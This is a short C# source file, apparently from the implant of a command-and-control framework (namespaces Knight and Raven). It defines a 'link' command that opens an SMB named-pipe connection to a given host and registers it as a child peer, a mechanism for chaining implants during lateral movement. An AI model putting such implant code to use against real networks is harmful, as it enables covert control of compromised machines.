using Knight.Models.Comm;
using Knight.Models.Raven;

namespace Knight.Commands
{
    public class Link : KnightCommand
    {
        public override string Name => "link";

        public override string Execute(TaskMessage task)
        {
            var hostname = task.Arguments[0];
            var pipename = task.Arguments[1];
            
            AllyCommModule commModule = new SmbCommModule(hostname, pipename);

            Knight.AddChildAlly(task.TaskId, commModule);

            return $"Started Smb Client for {hostname}:{pipename}";
        }
    }
}
